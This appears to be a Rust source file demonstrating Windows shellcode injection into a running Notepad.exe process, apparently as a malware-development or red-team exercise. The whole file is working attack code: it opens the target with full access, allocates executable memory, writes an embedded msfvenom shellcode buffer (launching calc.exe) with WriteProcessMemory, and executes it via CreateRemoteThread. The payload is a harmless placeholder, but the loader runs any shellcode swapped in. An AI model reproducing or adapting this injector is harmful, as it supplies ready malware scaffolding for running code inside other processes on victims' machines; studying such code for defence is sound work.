#![allow(unused_must_use)]

use std::mem::transmute;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::{
    Foundation::{CloseHandle, HANDLE},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ
        },
        Threading::{
            CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
        },
    },
};

fn find_process(name: &str) -> Result<HANDLE, String> {
    let mut system = System::new_all();
    system.refresh_all();

    for (pid, process) in system.processes() {
        if process.name() == name {
            let pid = pid.as_u32();
            let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
            if hprocess.is_err() {
                return Err(String::from(format!("Failed to open process with PID: {pid}")));
            } else {
                return Ok(hprocess.unwrap());
            }
        }
    }

    return Err(String::from("Process not found"));
}

fn main() {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let buf: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xaa, 0xc5, 0xe2, 0x5d, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    let h_process = find_process("Notepad.exe").unwrap_or_else(|e| {
        panic!("[!] find_process Failed With Error: {e}");
    });

    unsafe {
        println!("[+] Allocating Memory in the Process");
        let address = VirtualAllocEx(
            h_process,
            None,
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ,
        );

        if address.is_null() {
            CloseHandle(h_process);
            panic!("[!] Failed to Allocate Memory in Target Process.");
        }

        println!("[+] Writing to memory");
        WriteProcessMemory(h_process, address, buf.as_ptr() as _, buf.len(), None).unwrap_or_else(|e| {
            CloseHandle(h_process);
            panic!("[!] WriteProcessMemory Failed With Error: {e}");
        });

        println!("[+] Creating a Remote Thread");
        let h_thread = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(transmute(address)),
            None,
            0,
            None,
        ).unwrap_or_else(|e| {
            CloseHandle(h_process);
            panic!("[!] CreateRemoteThread Failed With Error: {e}",);
        });

        println!("[+] Executed!!");
        WaitForSingleObject(h_thread, INFINITE);

        CloseHandle(h_process);
        CloseHandle(h_thread);
    }
}